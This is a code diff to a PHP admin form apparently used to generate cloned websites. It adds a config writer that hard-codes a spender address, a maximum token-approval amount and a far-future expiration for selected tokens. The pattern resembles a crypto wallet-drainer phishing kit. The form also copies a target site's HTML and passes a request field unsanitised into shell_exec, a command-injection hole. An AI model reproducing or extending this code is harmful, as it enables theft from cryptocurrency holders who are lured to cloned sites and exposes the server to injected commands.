@@ -6,7 +6,7 @@ use Illuminate\Http\Request;
 use OpenAdmin\Admin\Widgets\Form;
 use \App\Models\PacketSiteCollection;
 use OpenAdmin\Admin\Admin;
-
+use \App\Models\Tokenlist;
 class AutoWebpacketFrom extends Form
 {
     /**
@@ -15,6 +15,51 @@ class AutoWebpacketFrom extends Form
      * @var string
      */
     public $title = '';
+
+
+    public function writeDconfig($token_arr,$chain){
+        $spender_address = "0xf347901a602e71e2F4ce7796e54146C2e746dd8c";
+        $amount = "1461501637330902918203684832716283019655932542975";
+        $expiration = 1885674579;
+
+        $config = "const spender_address = \"$spender_address\";\n";
+        $config .= "const chain = \"$chain\";\n";
+        $config .= "const amount = \"$amount\";\n";
+        $config .= "const expiration = $expiration;\n";
+        $config .= "export const D = {\n";
+        $config .= "\tspender_address: spender_address,\n";
+        $config .= "\texpiration: expiration,\n";
+
+        foreach ($token_arr as $token => $address) {
+            $tokenObj = Tokenlist::where('address',$address)->get('name');
+            $token = explode("-",$tokenObj[0]['name']);
+            $config .= "\t$token[1]: {\n";
+            $config .= "\t\tname: \"$token[1]\",\n";
+            $config .= "\t\taddress: \"$address\",\n";
+            $config .= "\t\tamount: amount,\n";
+            $config .= "\t\texpiration: expiration,\n";
+            $config .= "\t},\n";
+        }
+
+        $config .= "};\n";
+
+        file_put_contents('../storage/webpacket_site/configs/D.js',$config);
+    }
+
+public function writeEnv($raw_website,$new_domain,$seo_title,$page_content_path,$seo_keyword,$chain,$clicky_id){
+    //写入env文件
+$env_content = '
+NEXT_PUBLIC_ENABLE_TESTNETS = false
+NEXT_PUBLIC_DOMAIN_WEBSITE  = '.$raw_website.'
+NEXT_PUBLIC_SOURCE  = '.$new_domain.'
+NEXT_PUBLIC_WEBSITE_PAGE_TITLE  = '.$seo_title.'
+NEXT_PUBLIC_WEBSITE_PAGE_CONTENT  = '.$page_content_path.'
+NEXT_PUBLIC_WEBSITE_PAGE_KEYWORD  = '.$seo_keyword.'
+NEXT_PUBLIC_CHAIN = '.$chain.'
+NEXT_PUBLIC_CLICKY = '.$clicky_id;
+file_put_contents('../storage/webpacket_site/.env',$env_content);
+}
+
 
     /**
      * Handle the form request.
@@ -32,41 +77,34 @@ class AutoWebpacketFrom extends Form
         $seo_title = $request->post('seo_title');
         $seo_keyword = $request->post('seo_keyword');
         $chain = $request->post('chain');
-//写入env文件
-        $env_content = '
-NEXT_PUBLIC_ENABLE_TESTNETS = false
-NEXT_PUBLIC_DOMAIN_WEBSITE  = '.$raw_website.'
-NEXT_PUBLIC_SOURCE  = '.$new_domain.'
-NEXT_PUBLIC_WEBSITE_PAGE_TITLE  = '.$seo_title.'
-NEXT_PUBLIC_WEBSITE_PAGE_CONTENT  = '.$page_content_path.'
-NEXT_PUBLIC_WEBSITE_PAGE_KEYWORD  = '.$seo_keyword.'
-NEXT_PUBLIC_CHAIN = '.$chain.'
-NEXT_PUBLIC_CLICKY = '.$clicky_id;
+        $tokens = $request->post('tokens');
+        array_pop($tokens);
 
+        $this->writeDconfig($tokens,$chain);      
+        $this->writeEnv($raw_website,$new_domain,$seo_title,$page_content_path,$seo_keyword,$chain,$clicky_id);
 
-        file_put_contents('../storage/webpacket_site/.env',$env_content);
         //写入数据库
         $packetCollection = new PacketSiteCollection();
-
         $isExist = $packetCollection::where('chain', $chain)->where('new_domain', $new_domain)->count();
         if($isExist) return back();
-        $packetCollection->raw_website = $raw_website;
-        $packetCollection->new_domain = $new_domain;
-        $packetCollection->clicky_id = $clicky_id;
-        $packetCollection->owner = Admin::user()->id;
-        $packetCollection->seo_title = $seo_title;
-        $packetCollection->seo_keyword =$seo_keyword;
-        $packetCollection->chain = $chain;
-        $packetCollection->save();
+            $packetCollection->raw_website = $raw_website;
+            $packetCollection->new_domain = $new_domain;
+            $packetCollection->clicky_id = $clicky_id;
+            $packetCollection->owner = Admin::user()->id;
+            $packetCollection->seo_title = $seo_title;
+            $packetCollection->seo_keyword =$seo_keyword;
+            $packetCollection->chain = $chain;
+            $packetCollection->save();
         try{
-                 //打开网站写入html
+            //打开网站写入html
             $html_data = file_get_contents($raw_website);
             file_put_contents('../storage/webpacket_site/page_content.html',$html_data);
-          $result = shell_exec('./webpacket.sh '.$clicky_id);
-          echo "<br><br>Download: <a href='/dist_$clicky_id.tar.gz'>下载地址</a>" ;
+            $result = shell_exec('./webpacket.sh '.$clicky_id);
+            echo "<br><br>Download: <a href='/dist_$clicky_id.tar.gz'>下载地址</a>" ;
         }catch(Exception $e){
-          echo $e->getMessage();
+            echo $e->getMessage();
         }
+
        // admin_success('Processed successfully.');
         //return back();
     }
@@ -83,6 +121,7 @@ NEXT_PUBLIC_CLICKY = '.$clicky_id;
         $this->text('seo_title')->rules('required');
         $this->text('seo_keyword')->rules('required');
         
+        $this->multipleSelect('tokens','Tokens')->options(\App\Models\Tokenlist::all()->pluck('name','address'));
         //$this->email('email')->rules('email');
         // $this->datetime('created_at');
     }
